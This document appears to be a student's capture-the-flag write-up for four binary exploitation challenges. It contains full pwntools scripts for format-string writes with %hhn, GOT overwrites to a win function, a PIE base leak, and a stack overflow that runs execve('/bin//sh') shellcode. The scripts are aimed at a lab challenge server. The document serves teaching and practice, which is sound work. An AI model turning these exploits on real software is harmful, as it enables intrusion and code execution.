# Door

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1kb29yIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6IjllYTg3YzU0LWIwYjItNGUyMS1hYjVkLTA2YjJhMGViMTAxNSJ9.Zglm3dj4pU0GjsgcDdyhB7uFTieyWUYfMTBHQS5_ij0}

## Scenario

There is a vulnerable printf function that is 0x200 bytes long.  
There are four bytes at ebp-0x5 that need to be overwritten to 'A', 'P', 'E', 'S'

## Solution

Perform a format string attack with the vulnerable printf function to overwrite the four bytes.  
When overwriting byte-by-byte, `%hhn` should be used.  
An offset of 1 byte was required to byte-align the values.

## Script

```python3
from pwn import *
import re

# p = process("./door")
p = remote('plsdonthaq.me', 4001)

p.recvuntil(b'A landslide has blocked the way at ')

landSlideAddress = int(p.recvline(keepends=False), 16)
print(f"ebp-0x5 = {hex(landSlideAddress)}")

ebp = landSlideAddress + 0x5
print(f"Calculated ebp = {hex(ebp)}")

## fgets(ebp-0x205, 0x200, stdin)
## printf(ebp-0x205)

# We want to overwrite the contents at ebp-0x205 to be "APES"
payload = b''
payload += b'.' # Offset
payload += p32(landSlideAddress)   # Write 65
payload += p32(landSlideAddress+1) # Write 80
payload += p32(landSlideAddress+2) # Write 69
payload += p32(landSlideAddress+3) # Write 83
# 17 characters already used

p.sendline(payload + b'%48c%2$hhn' + b'yeet%4$hhn' + b'%11c%3$hhn' + b'lol%5$hhn')
#               17      + 48 = 65        + 4 = 69       + 11 = 80       + 3 = 83

p.interactive()

```

---

# Snake

> Flag: `FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1zbmFrZSIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiI4YjQ0OWFhYi0xMjRlLTQxYTctYjhhYi0xOGExZGU4NDIxM2UifQ.ZGUuLpimuOjUDwUJxO5p2KU9W2ZwpjLWDYcq_kKrL2w}`

## Scenario

In the main program loop, there is a stack address leakable through the Print Flag option - if you enter the password.  
There is no win function, and the flag address probably doesn't have a flag... But we do have a vulnerable `gets` function, and an executable stack :hm:...

## Solution

A static analysis of the program reveals that any password greater than 0x50 bytes long is considered correct.  
From here, we learn about an address on the stack; which we can use to find the ebp and esp addresses for that frame.  
There is a vulnerable `gets` function in the `get_name` function, which we can populate with shellcode to launch a shell.  
To overflow the return address, we can find out (I'm not too sure how exactly to determine this, but I compared values during runtime with gdb) that the ebp address for the new frame is 0x78 bytes away from the calling frame - so we can do some maths to figure out the address of the start of the buffer. By overflowing the buffer and the return address, we can execute our shellcode to get the flag

## Script

```python3
from pwn import *
import re

# p = process("./snake")
p = remote('plsdonthaq.me', 4002)

# Vulnerable `gets(ebp-0x32)`

# password prompt reads 0x63 bytes
# The error message which leaks an address on the stack when anything greater than 0x50 (80) characters is passed in
p.sendline(b"3")
p.sendline(b"*" * 80)
p.recvuntil("Error occurred while printing flag at offset ")

flagAddress = int(p.recvline(keepends=False), 16)
print(f"Flag Address at = {hex(flagAddress)}")
# It's not actually a flag address though - the flag isn't loaded anywhere

ebp = flagAddress + 0xc
print(f"Calculated read_option::ebp = {hex(ebp)}")

# Shellcode for `execve("/bin//sh", NULL, NULL, NULL)`
assembly = f"""
   push 0x68732f2f
   push 0x6e69622f

   mov ebx, esp

   mov eax, 0xb
   xor ecx, ecx
   xor edx, edx
   xor esi, esi
   int 0x80
"""
shellcode = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))

# get_name()'s ebp is 0x78 away
getName_ebp = ebp - 0x78

p.sendline(b"1")

pause()
payload = b""
payload += b'\x90' * (0x32 - len(shellcode))
payload += shellcode
payload += b'yeet' # Okay, not toooooo sure why I need this here, but it crashes if I don't.
payload += p32(getName_ebp - 0x32)

p.sendline(payload)

p.interactive()
```

---

# For Matrix

> Flag: `FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1mb3JtYXRyaXgiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiYjdmNWU1MTEtMzU1Ni00ZTgxLWJmZWYtNzZiOTM2YTUwMjBlIn0.Wdz38UVHLuCjsYl7tNDFYM33ltvbVUcSEIDTYj4-SCM}`

## Scenario

There is a format string vulnerable `sprintf` function that allows a user to enter in up to 512 bytes.  
This format string will then be evaluated, meaning that we can override either the `puts` or `printf` GOT entry to point to the `win` function.

## Solution

We have a choice of either overwriting the `puts` or `printf` function.  
The `win` function however, also uses the `puts` function. So as to prevent an infinite loop, we'll override the `printf` function instead.  

We can push the four addresses of the bytes containing the `printf` GOT entry, and then write in the bytes with `%hhn`.  

## Script

```python3
from pwn import *
import re

# p = process("./formatrix")
p = remote('plsdonthaq.me', 4003)

# fgets(ebp-0x208, 0x200, stdin)
# sprintf(ebp-0x608, ep-0x208)

# There is a win() function which will pop our shell
# Either overwrite puts, or printf.  
# However, the win function also uses puts, so we don't want to cause an infinite loop.
# Override printf!

printf_GOT = 0x8049c18 # From the ELF

""" Time for some quick maffs

Win Address = 0x8048536 (From the ELF)

We're going to inject the values one byte at a time.  
To do, we'll need to start the string with the four addresses of each byte for the printf GOT.  

0x08 -> addr+3
0x04 -> addr+2
0x85 -> addr+1
0x36 -> addr+0

Due to needing to include the addresses, %n write will start of as >= 16.  
We'll start at 0x36, then go to 0x85, then overflow to 0x04, then go to 0x08

0x36 -> addr+0
0x85 -> addr+1
0x04 -> addr+2
0x08 -> addr+3

# Oh hey it's just reverse order!
"""

'''
payload = b"AAAA"+ b" %p" * 10
AAAA 0xf77885a0 0x804858c 0x41414141 0x66783020 0x38383737 0x20306135 0x30387830 0x38353834 0x78302063 0x31343134

We can read our string at the third 4-byte index i.e. %3$p
'''

payload = b""
payload += p32(printf_GOT+0)
payload += p32(printf_GOT+1)
payload += p32(printf_GOT+2)
payload += p32(printf_GOT+3)

payload += b"." * (0x36 - len(payload))
payload += b'%3$hhn'

payload += b"." * (0x85 - 0x36)
payload += b'%4$hhn'

payload += b"." * ((0x04 - 0x85) & 0xFF)
payload += b'%5$hhn'

payload += b"." * (0x08 - 0x04)
payload += b'%6$hhn'

p.sendline(payload)
p.interactive()
```

---

# Sploitwarz

> Flag: `FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1zcGxvaXR3YXJ6IiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6IjJkMDY4MjczLWI4ZDctNDA5Mi1hNDcyLTJlMzU3ZmQxNWUxMiJ9.QzhvGMD4PJqb0mcvwLwlXrmodq0sKR8RAKM3J7mUDRo}`

## Scenario

The program has a win address that we need to jump to, either by means of overriding the return address, or by some other means...  
PIE and the NX bit is enabled, however RELRO is disabled... Hmm.. GOT?  
The program has a vulnerable printf function that occurs in the `do_gamble` function

## Solution

The vulnerable printf function occurs when the correct guess is made in the `do_gamble` function. We can reach this outcome by spamming the same guess choice until it matches.  
We can then leak the stack with `%p` to find out that the third entry on the stack contains an address that belongs to the program code. This allows us to counter the PIE protection as are able to find the program base address. We can then find the addresses of the `win` function as well as the address for `printf@GOT`, and modify the GOT table to call our win function when printf is called.

## Script

```python3
from pwn import *
import re

def splitByte4(byte4, *, littleEndian = True):
    assert(type(byte4) is int)
    result = []
    while byte4:
        result.append(byte4 & 0xFF)
        # result = [byte4 & 0xFF, *byte4]
        byte4 >>= 8
    return result if littleEndian else result[::-1]

def packFmt(byteArray, pad=0):
    items = [(byteArray[i], i) for i in range(len(byteArray))]
    return sorted(items, key=lambda t: (t[0] - pad) & 0xFF)

def genFmt(byte4, where, stackStart):
    payload = b''
    payload += p32(where+0)
    payload += p32(where+1)
    payload += p32(where+2)
    payload += p32(where+3)
    dataLen = len(payload)
    packedValues = packFmt(splitByte4(byte4), dataLen)
    for value in packedValues:
        change = (value[0] - dataLen) & 0xFF
        part = f'%{change}c'.encode() if change else b''
        payload += part
        payload += f'%{stackStart + value[1]}$hhn'.encode()
        dataLen += change
    return payload


# do_gamble :: 0x000015d2  ebp-0x234
"""
strncpy(ebp-0x234 <?>, arg1+0x14 <var_248>, 0x100 <256>)
"""

def do_gamble():
    p.recv()
    p.sendline('g')
    p.sendline('0.00001')
    p.sendline('5')
    p.recvuntil('\n> \n')
    result = p.recvline(keepends=False)
    if b"i still havn't watched avengers" in result:
        return True
    p.sendline('')
    match = re.match(b'Well done, (.+?)! You win .*', result)
    return match.groups()[0] if match else False

def __set_handle(name):
    if len(name) > 255:
        print("Payload limit reached!")
        import sys
        sys.exit(1)
    p.sendline(name)

def do_handle(name):
    p.sendline('c')
    __set_handle(name)
    
def leak(handle=None):
    if handle is not None:
        do_handle(handle)
    while 1:
        result = do_gamble()
        if result: return result


if __name__ == "__main__":
    # p = process("./sploitwarz")
    p = remote('plsdonthaq.me', 4004)

    p.recvuntil(" your handle?\n> ")
    __set_handle(b"z5206677") # Wow is this proof of work :o

    # PIE randomises the address of each memory segment, but the relative addresses remain the same
    # leak("%1$p") -> The address of the buffer, but it's stored in a different region to the code
    # leak("%2$p") -> The pushed value 0x100
    # leak("%3$p") -> Some value `0x156d` away from the program base

    # The third item on the stack is an address in the program base memory region
    # As offsets are static (and only the base shifts), if we can leak the address (which we can),
    # then we can calculate the base
    leaked = int(leak("%3$p"), 16)
    base = leaked - 0x156d
    print(f"Calculated program base = {hex(base)}")
    
    # We can get the win address by adding the win address offset to the base
    win_offset = 0xab4
    win_addr = base + win_offset
    print(f"Calculated win address = {hex(win_addr)}")

    # We can get the printf@GOT address by adding the printf@GOT entry address offset to the base
    printf_got_offset = 0x3528
    printf_got_address = base + printf_got_offset
    print(f"Calculated printf@GOT address = {hex(printf_got_address)}")

    # Now we want to perform a format string vulnerability to change printf@GOT to point to the win function
    # The fifth stack item contains the contents of our buffer, so we can write our addresses in through %5$n, %6$n, %7$n, %8$n
    leak(genFmt(win_addr, printf_got_address, 5))
    p.interactive()
```